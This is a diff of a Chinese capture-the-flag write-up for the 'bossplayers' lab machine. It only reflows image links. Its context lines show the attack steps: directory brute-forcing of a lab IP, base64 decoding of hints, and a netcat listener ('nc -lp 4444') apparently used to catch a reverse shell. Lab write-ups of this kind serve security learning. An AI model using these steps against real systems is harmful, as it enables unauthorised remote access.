@@ -26,7 +26,8 @@ dirb http://192.168.56.101/
 
 > **浏览后发现Base64编码,为什么判断是Base64呢?请看下面**
 
-![](./img/bossplayers-03.png)![](/img/bossplayers-04.png)
+![](./img/bossplayers-03.png)
+![](./img/bossplayers-04.png)
 
 ```
 echo 'bG9sIHRyeSBoYXJkZXIgYnJvCg==' | base64 -d
@@ -50,7 +51,8 @@ echo 'd29ya2luZ2lucHJvZ3Jlc3MucGhwCg==' | base64 -d
 
 > **感觉像在提示，我们试一下能不能使用命令**
 
-![](./img/bossplayers-08.png)![](./img/bossplayers-09.png)
+![](./img/bossplayers-08.png)
+![](./img/bossplayers-09.png)
 
 ```
 nc -lp 4444
